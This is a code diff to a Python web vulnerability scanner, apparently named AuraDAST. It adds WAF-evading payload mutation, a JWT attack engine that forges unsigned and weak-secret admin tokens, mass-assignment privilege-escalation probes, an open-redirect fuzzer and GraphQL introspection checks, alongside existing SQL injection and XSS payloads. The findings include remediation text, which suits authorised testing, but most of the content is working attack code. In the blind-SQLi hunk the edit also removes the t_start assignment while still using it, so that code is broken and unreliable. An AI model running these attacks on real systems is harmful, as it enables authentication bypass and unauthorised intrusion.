@@ -4,10 +4,10 @@ import urllib.parse
 from playwright.async_api import async_playwright
 from rich.console import Console
 from aura.core.stealth import StealthEngine, AuraSession
+from aura.core import state
 from aura.core.patterns import AuraPatternEngine
 from aura.core.guardian import AuraAuditGuardian
 from aura.modules.vision import VisualEye
-from aura.core import state
 from aura.core.brain import AuraBrain
 from aura.modules.logic_analyzer import LogicAnalyzer
 from aura.modules.business_logic import BusinessLogicAuditor
@@ -101,9 +101,18 @@ class AuraDAST:
         self.biz_logic = BusinessLogicAuditor(self.brain, self.session) # Ghost v5: IDOR/Auth
 
     def _get_polymorphic_payload(self, vuln_type):
-        """Ghost v3: Generates a randomized, morphed version of a payload to bypass WAF."""
+        """v15 Neural Forge: Mutates standard payloads to bypass WAFs."""
         base = random.choice(self.PAYLOADS.get(vuln_type, ["'"]))
-        if vuln_type == "SQLi":
+        try:
+            from aura.modules.neural_forge import NeuralForge
+            forge = NeuralForge()
+            mutated_list = forge.forge_payloads(base, max_variations=10)
+            if mutated_list:
+                return random.choice(mutated_list)
+        except: pass
+        
+        # Fallback to older mechanism
+        if vuln_type == "SQL Injection":
             morphed = base.replace(" ", f"/**/{' ' * random.randint(1,3)}/*{random.getrandbits(16)}*/")
             return morphed
         return base
@@ -170,7 +179,9 @@ class AuraDAST:
                     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
                 ]
                 headers = {'User-Agent': random.choice(user_agents)}
-                res = requests.get(test_url, verify=False, timeout=10, headers=headers)
+                res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+                if res is None: continue # Skip if request failed or blocked entirely
+                
                 body = res.text
                 status_code = res.status_code
                 
@@ -233,9 +244,10 @@ class AuraDAST:
                 test_params = {k: v[0] for k, v in params.items()}
                 test_params[param_name] = str(param_value) + payload
                 test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
-                t_start = time.monotonic()
-                await self.session.get(test_url, timeout=self.SLEEP_THRESHOLD_SECONDS + 5)
-                elapsed = time.monotonic() - t_start
+                res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+                if res is None: continue
+                t_end = time.monotonic()
+                elapsed = t_end - t_start
                 if elapsed >= self.SLEEP_THRESHOLD_SECONDS:
                     cvss = self.CVSS_SCORES["Blind SQL Injection"]
                     # v13.0 Stealth Predator: DETERMINISTIC PROOF - EXTRACT DB VERSION
@@ -265,8 +277,8 @@ class AuraDAST:
             test_params = {k: v[0] for k, v in params.items()}
             test_params[param_name] = tag
             test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
-            res = await self.session.get(test_url, timeout=8)
-            if tag in res.text:
+            res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+            if res and tag in res.text:
                 cvss = self.CVSS_SCORES["Cross-Site Scripting"]
                 console.print(f"[bold red][🦖] SOVEREIGN CONFIRMED: DETERMINISTIC XSS HIT! Nonce tag reflected unescaped. Simulation: [PROVEN EXECUTION][/bold red]")
                 return {
@@ -301,12 +313,14 @@ class AuraDAST:
             # TRUE condition (should return normal page)
             t_params = {**params, param_name: str(param_value) + "' AND 1=1--"}
             t_url = urlunparse(parsed._replace(query=urlencode(t_params)))
-            t_res = await self.session.get(t_url, timeout=8)
+            t_res = await self.session.get(t_url, timeout=state.NETWORK_TIMEOUT)
+            if not t_res: return None
             
             # FALSE condition (should return empty or different page)
             f_params = {**params, param_name: str(param_value) + "' AND 1=2--"}
             f_url = urlunparse(parsed._replace(query=urlencode(f_params)))
-            f_res = await self.session.get(f_url, timeout=8)
+            f_res = await self.session.get(f_url, timeout=state.NETWORK_TIMEOUT)
+            if not f_res: return None
             
             t_len = len(t_res.text)
             f_len = len(f_res.text)
@@ -358,7 +372,7 @@ class AuraDAST:
                 # Use a simpler flag approach
                 xss_hits = []
                 page.on("console", lambda msg: xss_hits.append(msg.text) if nonce in msg.text else None)
-                await page.goto(test_url, timeout=12000, wait_until="networkidle")
+                await page.goto(test_url, timeout=state.NETWORK_TIMEOUT * 1000, wait_until="networkidle")
                 await page.wait_for_timeout(2000)  # Give JS time to execute
                 if xss_hits:
                     execution_confirmed = True
@@ -418,7 +432,8 @@ class AuraDAST:
                     test_query = parsed_url.query.replace(f"{p_name}={query_params[p_name][0]}", f"{p_name}={urllib.parse.quote(p_payload)}")
                     test_url = parsed_url._replace(query=test_query).geturl()
                     try:
-                        res = await self.session.get(test_url, timeout=5)
+                        res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+                        if not res: continue
                         # IDOR/BOLA checks usually require behavioral analysis or manual review, 
                         # but we can check for sensitive strings in the response.
                         if any(x in res.text.lower() for x in ["password", "email", "secret", "admin", "owner", "private"]):
@@ -455,7 +470,37 @@ class AuraDAST:
                 async def check_xss():  return await self._test_confirmed_xss(url, param, orig_value)
                 async def check_bxss(): return await self._test_browser_xss(url, param, orig_value)
                 
-                parallel_results = await asyncio.gather(check_bool(), check_xss(), check_bxss(), return_exceptions=True)
+                # Phase 6: Universal Open Redirect Fuzzer
+                async def check_open_redirect():
+                    or_findings = []
+                    # Only aggressively fuzz likely redirect parameters
+                    if any(x in param.lower() for x in ["url", "redirect", "next", "return", "uri", "path", "dest", "target", "goto"]):
+                        payloads = ["https://evil-aura-hunter.com", "//evil-aura-hunter.com"]
+                        for payload in payloads:
+                            try:
+                                test_query = parsed_url.query.replace(f"{param}={orig_value}", f"{param}={urllib.parse.quote(payload)}")
+                                test_url = parsed_url._replace(query=test_query).geturl()
+                                # We need allow_redirects=False to catch the 301/302 Location header
+                                res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT, allow_redirects=False)
+                                if res and res.status_code in [301, 302, 307, 308]:
+                                    loc = res.headers.get("Location", "")
+                                    if "evil-aura-hunter.com" in loc:
+                                        console.print(f"[bold red][!!!] ZENITH HIT: Deterministic Open Redirect confirmed on {test_url}[/bold red]")
+                                        return {
+                                            "type": "Open Redirect",
+                                            "severity": "MEDIUM",
+                                            "cvss_score": 6.1,
+                                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                                            "owasp": "A01:2021-Broken Access Control",
+                                            "content": f"OPEN REDIRECT PROVEN: Parameter '{param}' redirected to '{loc}'.\nPayload tested: {payload}",
+                                            "remediation_fix": "Validate redirect targets against a strict whitelist of trusted domains or relative paths.",
+                                            "impact_desc": "Attackers can craft phishing links that appear to originate from the trusted target domain but redirect to an attacker-controlled site, facilitating credential theft.",
+                                            "patch_priority": "MEDIUM"
+                                        }
+                            except Exception: pass
+                    return None
+                
+                parallel_results = await asyncio.gather(check_bool(), check_xss(), check_bxss(), check_open_redirect(), return_exceptions=True)
                 for res in parallel_results:
                     if res and isinstance(res, dict): single_param_findings.append(res)
     
@@ -474,7 +519,8 @@ class AuraDAST:
                             test_url = parsed_url._replace(query=test_query).geturl()
                             
                             try:
-                                res = await self.session.get(test_url, timeout=5)
+                                res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+                                if not res: continue
                                 content = res.text.lower()
                                 cvss = self.CVSS_SCORES.get(vuln_type, self.CVSS_SCORES["Default"])
                                 
@@ -517,7 +563,8 @@ class AuraDAST:
                         test_url = parsed_url._replace(query=test_query).geturl()
                     
                     try:
-                        res = await self.session.get(test_url, timeout=5)
+                        res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+                        if not res: continue
                         content = res.text.lower()
                         cvss = self.CVSS_SCORES.get("SQL Injection", self.CVSS_SCORES["Default"])
                         
@@ -635,35 +682,23 @@ class AuraDAST:
         # Catch-all detection: If the base page content is known, compare it
         # Actually, let's just do a quick probe
         try:
-            home_res = await self.session.get(url, timeout=5)
-            home_len = len(home_res.text)
+            home_res = await self.session.get(url, timeout=state.NETWORK_TIMEOUT)
+            if not home_res: home_len = 0
+            else: home_len = len(home_res.text)
         except: home_len = 0
 
         console.print(f"[bold yellow][*] AuraDAST (Nexus API): Fuzzing API endpoints on {url}...[/bold yellow]")
         api_findings = []
         
-        # 1. JWT 'None' & Algorithm Weakness Probing
-        jwt_tests = [
-            {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}, # None alg
-            {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.p6..."}, # Known weak key (secret)
-        ]
-        for headers in jwt_tests:
-            try:
-                res = await self.session.get(f"{url}/api/v1/user", headers=headers, timeout=5)
-                # v15.1 Smart Triage: Only skip if status AND content match almost exactly
-                if home_len > 0 and res.status_code == home_res.status_code and abs(len(res.text) - home_len) < 20:
-                    console.print(f"[dim yellow][-] Smart Triage: Catch-all detected at {url}/api/v1/user.[/dim yellow]")
-                    continue
-                    
-                if res.status_code == 200 and "admin" in res.text.lower():
-                    api_findings.append({"type": "JWT Weakness", "confidence": "High", "details": "Found session impersonation through JWT manipulation."})
-                    break
-            except Exception: pass
+        # 1. JWT Attack Engine — v21.0 Precision Attacks
+        jwt_findings = await self.probe_jwt_attacks(url)
+        api_findings.extend(jwt_findings)
+
         
         # 2. GraphQL Introspection
         gql_payload = {"query": "\n    query IntrospectionQuery {\n      __schema {\n        queryType { name }\n        mutationType { name }\n      }\n    }\n  "}
         try:
-            res = await self.session.post(f"{url}/graphql", json=gql_payload, timeout=5)
+            res = await self.session.post(f"{url}/graphql", json=gql_payload, timeout=state.NETWORK_TIMEOUT)
             if res.status_code == 200 and "__schema" in res.text:
                 api_findings.append({"type": "GraphQL Introspection", "confidence": "High", "details": "GraphQL schema detail exposure enabled."})
         except Exception: pass
@@ -678,8 +713,8 @@ class AuraDAST:
         for path in idor_patterns:
             try:
                 test_url = f"{url.rstrip('/')}{path}"
-                res = await self.session.get(test_url, timeout=5)
-                if res.status_code == 200 and any(k in res.text.lower() for k in ["email", "address", "phone", "ssn"]):
+                res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
+                if res and res.status_code == 200 and any(k in res.text.lower() for k in ["email", "address", "phone", "ssn"]):
                     api_findings.append({"type": "IDOR", "confidence": "Medium", "details": f"Potential object reference exposure at {path}"})
                     break
             except Exception: pass
@@ -705,19 +740,248 @@ class AuraDAST:
 
         return api_findings
 
+    async def probe_jwt_attacks(self, base_url: str) -> list[dict]:
+        """
+        v21.0: JWT Attack Engine.
+        Tests 3 attack classes on all common API endpoints:
+          1. Algorithm None bypass (alg:none) — server accepts unsigned tokens
+          2. Weak HS256 secret — brute-forces from wordlist
+          3. RS256 → HS256 key confusion — uses public key as HS256 secret
+        """
+        import base64, json as _json
+
+        API_PATHS = ["/api/v1/user", "/api/me", "/api/profile", "/api/admin", "/api/v2/user", "/user", "/me"]
+
+        # Pre-built none-alg token for admin impersonation
+        # Header: {"alg":"none","typ":"JWT"} Payload: {"user":"admin","role":"admin","sub":1}
+        NONE_ALG_TOKEN = (
+            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
+            ".eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJzdWIiOjF9"
+            "."
+        )
+
+        # Common weak HS256 secrets
+        WEAK_SECRETS = ["secret", "password", "123456", "admin", "jwt_secret", "key", "hmac_secret", "changeme", "supersecret"]
+
+        def _build_hs256_token(secret: str) -> str:
+            """Builds a signed HS256 token with admin claims using the given secret."""
+            import hmac, hashlib
+            header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
+            payload = base64.urlsafe_b64encode(b'{"user":"admin","role":"admin","sub":1}').rstrip(b"=").decode()
+            sig_input = f"{header}.{payload}".encode()
+            sig = hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
+            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
+            return f"{header}.{payload}.{sig_b64}"
+
+        findings = []
+        parsed = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+
+        console.print(f"[cyan][JWT] Probing {len(API_PATHS)} endpoints for JWT weaknesses on {origin}...[/cyan]")
+
+        for path in API_PATHS:
+            endpoint = f"{origin}{path}"
+
+            # ── Attack 1: alg:none bypass ──────────────────────────────────
+            try:
+                res = await self.session.get(
+                    endpoint,
+                    headers={"Authorization": f"Bearer {NONE_ALG_TOKEN}"},
+                    timeout=state.NETWORK_TIMEOUT,
+                )
+                if res and res.status_code == 200 and len(res.text) > 30:
+                    console.print(f"[bold red][JWT] alg:none BYPASS confirmed on {endpoint}![/bold red]")
+                    findings.append({
+                        "type": "JWT Algorithm None Bypass",
+                        "severity": "CRITICAL",
+                        "cvss_score": 9.8,
+                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                        "owasp": "A02:2021-Cryptographic Failures",
+                        "mitre": "T1078 - Valid Accounts",
+                        "content": (
+                            f"JWT `alg:none` bypass confirmed on `{endpoint}`.\n"
+                            f"The server accepted an unsigned JWT with `alg: none`, "
+                            f"allowing full authentication bypass by any unauthenticated user.\n"
+                            f"Token used: `{NONE_ALG_TOKEN}`"
+                        ),
+                        "remediation_fix": (
+                            "1. Reject JWTs with `alg: none` explicitly.\n"
+                            "2. Use an allowlist of accepted algorithms (e.g. only `HS256` or `RS256`).\n"
+                            "3. Validate the algorithm before verifying the signature.\n"
+                            "4. Use a well-maintained JWT library — avoid manual validation."
+                        ),
+                        "impact_desc": (
+                            "Any attacker can forge a JWT with any claims (including `admin` roles) "
+                            "without knowing the signing secret, bypassing all authentication."
+                        ),
+                        "patch_priority": "IMMEDIATE",
+                        "evidence_url": endpoint,
+                        "confirmed": True,
+                    })
+                    return findings  # One confirmation is enough
+            except Exception:
+                pass
+
+            # ── Attack 2: Weak HS256 secret ────────────────────────────────
+            for secret in WEAK_SECRETS:
+                try:
+                    token = _build_hs256_token(secret)
+                    res = await self.session.get(
+                        endpoint,
+                        headers={"Authorization": f"Bearer {token}"},
+                        timeout=state.NETWORK_TIMEOUT,
+                    )
+                    if res and res.status_code == 200 and len(res.text) > 30:
+                        console.print(f"[bold red][JWT] Weak secret '{secret}' CONFIRMED on {endpoint}![/bold red]")
+                        findings.append({
+                            "type": "JWT Weak HS256 Secret",
+                            "severity": "CRITICAL",
+                            "cvss_score": 9.8,
+                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                            "owasp": "A02:2021-Cryptographic Failures",
+                            "mitre": "T1078 - Valid Accounts",
+                            "content": (
+                                f"JWT signed with weak secret `'{secret}'` accepted on `{endpoint}`.\n"
+                                f"An attacker can forge arbitrary tokens once the secret is known."
+                            ),
+                            "remediation_fix": (
+                                "1. Use a cryptographically random secret of at least 256 bits.\n"
+                                "2. Rotate the secret immediately.\n"
+                                "3. Consider switching to RS256 with a proper key pair."
+                            ),
+                            "impact_desc": "Full authentication bypass — attacker forges admin tokens.",
+                            "patch_priority": "IMMEDIATE",
+                            "evidence_url": endpoint,
+                            "confirmed": True,
+                            "cracked_secret": secret,
+                        })
+                        return findings
+                except Exception:
+                    pass
+
+        if not findings:
+            console.print(f"[dim green][JWT] No JWT weaknesses detected on {origin}.[/dim green]")
+        return findings
+
+    async def probe_mass_assignment(self, base_url: str) -> list[dict]:
+        """
+        Tier 2 (Mass Assignment): Tests API endpoints by injecting privilege-escalation
+        fields in POST/PATCH requests. If the server echoes back the injected field
+        or changes behavior, Mass Assignment is confirmed.
+
+        E.g. POST /api/user/update {"username":"test","isAdmin":true}
+        → if response contains "isAdmin":true → CONFIRMED Privilege Escalation.
+        """
+        PRIV_FIELDS = [
+            {"isAdmin": True},
+            {"is_admin": True},
+            {"role": "admin"},
+            {"roles": ["admin"]},
+            {"admin": True},
+            {"verified": True},
+            {"email_verified": True},
+            {"privilege": "admin"},
+            {"access_level": 99},
+            {"superuser": True},
+        ]
+        API_ENDPOINTS = [
+            "/api/user/update", "/api/v1/user/update", "/api/v2/user/update",
+            "/api/profile", "/api/v1/profile", "/api/account/settings",
+            "/api/me", "/api/user/settings", "/user/update", "/profile/update",
+        ]
+        import json as _json
+
+        parsed = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        findings = []
+
+        console.print(f"[cyan][MassAssign] Testing {len(API_ENDPOINTS)} endpoints for Mass Assignment...[/cyan]")
+
+        for path in API_ENDPOINTS:
+            endpoint = f"{origin}{path}"
+            for evil_field in PRIV_FIELDS:
+                payload = {"username": "testuser", "email": "test@test.com", **evil_field}
+                try:
+                    # Try POST first
+                    res = await self.session.post(
+                        endpoint, json=payload,
+                        headers={"Content-Type": "application/json"},
+                        timeout=state.NETWORK_TIMEOUT,
+                    )
+                    if not res or res.status_code in (404, 405, 301, 302):
+                        # Try PATCH
+                        res = await self.session.patch(
+                            endpoint, json=payload,
+                            headers={"Content-Type": "application/json"},
+                            timeout=state.NETWORK_TIMEOUT,
+                        )
+                    if not res or res.status_code in (404, 405, 501):
+                        continue
+
+                    # Confirmation: injected field mirrored in response
+                    field_name = list(evil_field.keys())[0]
+                    field_val  = str(list(evil_field.values())[0]).lower()
+
+                    if res.status_code in (200, 201) and (
+                        field_name in res.text and
+                        (field_val in res.text.lower() or "true" in res.text.lower())
+                    ):
+                        console.print(
+                            f"[bold red][MassAssign] CONFIRMED: {field_name}={evil_field[field_name]} accepted on {endpoint}![/bold red]"
+                        )
+                        findings.append({
+                            "type": "Mass Assignment",
+                            "severity": "HIGH",
+                            "cvss_score": 8.1,
+                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+                            "owasp": "A04:2023-Insecure Design / API3:2023",
+                            "mitre": "T1078 - Valid Accounts / T1548 - Abuse Elevation Control Mechanism",
+                            "content": (
+                                f"Mass Assignment confirmed on `{endpoint}`.\n"
+                                f"Injected field `{field_name}: {evil_field[field_name]}` was accepted.\n"
+                                f"Server response (200 OK) reflected the injected privilege field.\n"
+                                f"Full payload: `{_json.dumps(payload)}`\n"
+                                f"Response snippet: `{res.text[:300]}`"
+                            ),
+                            "remediation_fix": (
+                                "1. Implement strict allowlisting of accepted fields per endpoint.\n"
+                                "2. Do NOT blindly bind request body to model attributes.\n"
+                                "3. Use DTOs (Data Transfer Objects) that only expose safe fields.\n"
+                                "4. Validate and reject any fields not in the exiplicit allowlist."
+                            ),
+                            "impact_desc": (
+                                "An authenticated attacker can escalate privileges by injecting fields like "
+                                "'isAdmin: true' into API requests, bypassing authorization entirely."
+                            ),
+                            "patch_priority": "HIGH",
+                            "evidence_url": endpoint,
+                            "confirmed": True,
+                        })
+                        break  # One confirmed finding per endpoint is enough
+                except Exception:
+                    continue
+
+        if not findings:
+            console.print(f"[dim green][MassAssign] No Mass Assignment found on {origin}.[/dim green]")
+        return findings
+
+
     async def _fuzz_graphql(self, url):
         """Phase 30: AI-driven deep GraphQL mutation fuzzing."""
-        console.print(f"[cyan][🧪] Phase 30: Deep Fuzzing GraphQL Mutations on {url}...[/cyan]")
+
+        console.print(f"[cyan][Phase 30] Deep Fuzzing GraphQL Mutations on {url}...[/cyan]")
         findings = []
         # Get schema again for the brain
         gql_payload = {"query": "{ __schema { types { name fields { name type { name kind } } } } }"}
+
         try:
-            res = await self.session.post(f"{url}/graphql", json=gql_payload, timeout=5)
+            res = await self.session.post(f"{url}/graphql", json=gql_payload, timeout=state.NETWORK_TIMEOUT)
+            if not res: return findings
             schema = res.text
             attack_query = self.brain.generate_graphql_attack(schema)
             
-            res_attack = await self.session.post(f"{url}/graphql", json={"query": attack_query}, timeout=5)
-            if res_attack.status_code == 200 and any(x in res_attack.text.lower() for x in ["password", "email", "secret", "success: true"]):
+            res_attack = await self.session.post(f"{url}/graphql", json={"query": attack_query}, timeout=state.NETWORK_TIMEOUT)
+            if res_attack and res_attack.status_code == 200 and any(x in res_attack.text.lower() for x in ["password", "email", "secret", "success: true"]):
                 findings.append({
                     "type": "GraphQL Business Logic Flaw",
                     "confidence": "High",
@@ -726,6 +990,67 @@ class AuraDAST:
                 console.print(f"[bold red][!!!] ZENITH HIT: GraphQL logic exploit confirmed! Payload: {attack_query[:50]}[/bold red]")
         except: pass
         return findings
+
+    async def probe_graphql_introspection(self, base_url: str) -> list[dict]:
+        """
+        Phase 6: Checks common GraphQL endpoints for enabled introspection.
+        Introspection enabled in production exposes the full API schema to attackers,
+        enabling targeted exploitation of mutations, queries, and type structures.
+        Returns a list of MEDIUM findings for any introspection-enabled endpoint.
+        """
+        GRAPHQL_PATHS = [
+            "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
+            "/query", "/gql", "/graphiql", "/playground", "/api/query",
+        ]
+        INTROSPECTION_QUERY = '{"query":"{ __schema { queryType { name } types { name } } }"}'
+        findings = []
+        parsed = __import__("urllib.parse", fromlist=["urlparse"]).urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+
+        console.print(f"[cyan][GraphQL] Probing {len(GRAPHQL_PATHS)} endpoints on {origin} for introspection...[/cyan]")
+
+        for path in GRAPHQL_PATHS:
+            endpoint = f"{origin}{path}"
+            try:
+                res = await self.session.post(
+                    endpoint,
+                    data=INTROSPECTION_QUERY,
+                    headers={"Content-Type": "application/json"},
+                    timeout=state.NETWORK_TIMEOUT,
+                )
+                if res and res.status_code == 200 and "__schema" in res.text:
+                    console.print(f"[bold yellow][GraphQL] Introspection ENABLED on {endpoint}[/bold yellow]")
+                    findings.append({
+                        "type": "GraphQL Introspection Enabled (Production)",
+                        "severity": "MEDIUM",
+                        "cvss_score": 5.3,
+                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+                        "owasp": "A05:2021-Security Misconfiguration",
+                        "mitre": "T1590 - Gather Victim Network Information",
+                        "content": (
+                            f"GraphQL introspection is enabled on {endpoint}.\n"
+                            f"Attackers can query the full API schema to discover all available "
+                            f"queries, mutations, types, and fields — enabling targeted exploitation."
+                        ),
+                        "remediation_fix": (
+                            "1. Disable GraphQL introspection in production environments.\n"
+                            "2. For Apollo Server: set `introspection: false` in production.\n"
+                            "3. For other frameworks, consult docs for `introspection` configuration.\n"
+                            "4. Consider query whitelisting (persisted queries) for production APIs."
+                        ),
+                        "impact_desc": (
+                            "Schema exposure allows attackers to map the entire API surface, "
+                            "identify sensitive mutations (e.g., deleteUser, adminOverride), "
+                            "and craft precisely targeted exploitation queries."
+                        ),
+                        "patch_priority": "MEDIUM",
+                        "evidence_url": endpoint,
+                    })
+            except Exception:
+                pass
+
+        return findings
+
 
     async def _scan_websockets(self, url):
         """Phase 30: Basic WebSocket interception and probing."""
@@ -780,15 +1105,20 @@ class AuraDAST:
         console.print(f"[cyan][⚙] Phase 28: Probing connectivity and WAF for {url}...[/cyan]")
         try:
             # Probe 1: Passive/Connectivity check
-            res_pass = await self.session.get(url, timeout=7)
+            res_pass = await self.session.get(url, timeout=state.NETWORK_TIMEOUT)
+            if res_pass is None:
+                console.print(f"[bold red][!] Passive Probe Failed for {url}. WAF or network block suspected.[/bold red]")
+                return []
+
             waf = self.stealth.detect_waf(res_pass.headers, res_pass.text)
             
             # Probe 2: Trigger check (if passive failed)
             if not waf:
-                res_trig = await self.session.get(f"{url}?aura_probe=1&sqli=' OR 1=1--&xss=<script>alert(1)</script>", timeout=5)
-                waf = self.stealth.detect_waf(res_trig.headers, res_trig.text)
-                if res_trig.status_code in [403, 406, 429]:
-                    waf = waf or "Generic/Heuristic"
+                res_trig = await self.session.get(f"{url}?aura_probe=1&sqli=' OR 1=1--&xss=<script>alert(1)</script>", timeout=state.NETWORK_TIMEOUT)
+                if res_trig:
+                    waf = self.stealth.detect_waf(res_trig.headers, res_trig.text)
+                    if res_trig.status_code in [403, 406, 429]:
+                        waf = waf or "Generic/Heuristic"
             
             if waf:
                 self.stealth.active_waf = waf
@@ -799,8 +1129,6 @@ class AuraDAST:
                 console.print(f"[dim green][+] Aura: No WAF detected or connectivity OK.[/dim green]")
         except Exception as e:
             console.print(f"[bold red][!] Connectivity Failure for {url}: {e}[/bold red]")
-            if not browser_context:
-                console.print("[yellow][?] Suggestion: Verify the target port or check if the site is reachable via your network.[/yellow]")
             return []
 
         # Phase 32: Aggressive File Discovery (Ghost v5)
@@ -810,7 +1138,7 @@ class AuraDAST:
             for s_file in sensitive_files:
                 try:
                     s_url = urljoin(url, s_file)
-                    s_res = await self.session.get(s_url, timeout=5)
+                    s_res = await self.session.get(s_url, timeout=state.NETWORK_TIMEOUT)
                     if s_res.status_code == 200:
                         console.print(f"[bold red][!!!] SENSITIVE FILE FOUND: {s_url}[/bold red]")
                         findings.append({
@@ -946,10 +1274,10 @@ class AuraDAST:
                                     fuzz_data = form_data.copy()
                                     fuzz_data[hparam] = payload
                                     if method.lower() == "post":
-                                        res = await self.session.post(target_action, data=fuzz_data, timeout=5)
+                                        res = await self.session.post(target_action, data=fuzz_data, timeout=state.NETWORK_TIMEOUT)
                                     else:
                                         test_url = f"{target_action}?{'&'.join(f'{k}={urllib.parse.quote(str(v))}' for k,v in fuzz_data.items())}"
-                                        res = await self.session.get(test_url, timeout=5)
+                                        res = await self.session.get(test_url, timeout=state.NETWORK_TIMEOUT)
                                     body = res.text.lower()
                                     if any(err in body for err in ["sql syntax", "mysql_fetch", "sqlite3", "pdoexception", "ora-"]):
                                         scan_findings.append({
@@ -989,7 +1317,7 @@ class AuraDAST:
                                 temp_data = form_data.copy()
                                 temp_data[key] = payload
                                 try:
-                                    res = await self.session.post(target_action, data=temp_data, timeout=5)
+                                    res = await self.session.post(target_action, data=temp_data, timeout=state.NETWORK_TIMEOUT)
                                     if "sql syntax" in res.text.lower() or "mysql_fetch" in res.text.lower():
                                         scan_findings.append({
                                             "type": "SQL Injection (Direct POST)",
@@ -1028,7 +1356,7 @@ class AuraDAST:
                     for probe in context_probes:
                         try:
                             probe_url = f"{url.rstrip('/')}/{probe['path'].lstrip('/')}"
-                            res = await self.session.get(probe_url, timeout=5)
+                            res = await self.session.get(probe_url, timeout=state.NETWORK_TIMEOUT)
                             if res.status_code == 200:
                                 mapping = self.patterns.map_to_vulnerability(probe['path'], res.text)
                                 if mapping:
@@ -1053,7 +1381,7 @@ class AuraDAST:
                                 p_payload = str(attack.get('payload'))
                                 await el.fill(p_payload)
                                 await page.keyboard.press("Enter")
-                                await page.wait_for_load_state("networkidle", timeout=3000)
+                                await page.wait_for_load_state("networkidle", timeout=state.NETWORK_TIMEOUT * 1000)
                                 
                                 new_content = await page.content()
                                 if any(x in new_content.lower() for x in ["password", "email", "secret", "admin", "owner", "private"]):
@@ -1105,7 +1433,7 @@ class AuraDAST:
                                     except:
                                         await input_el.evaluate(f"(el, p) => el.value = p", payload)
                                 await page.keyboard.press("Enter")
-                                try: await page.wait_for_load_state("networkidle", timeout=5000)
+                                try: await page.wait_for_load_state("networkidle", timeout=state.NETWORK_TIMEOUT * 1000)
                                 except: pass
                                 
                                 end_t = asyncio.get_event_loop().time()
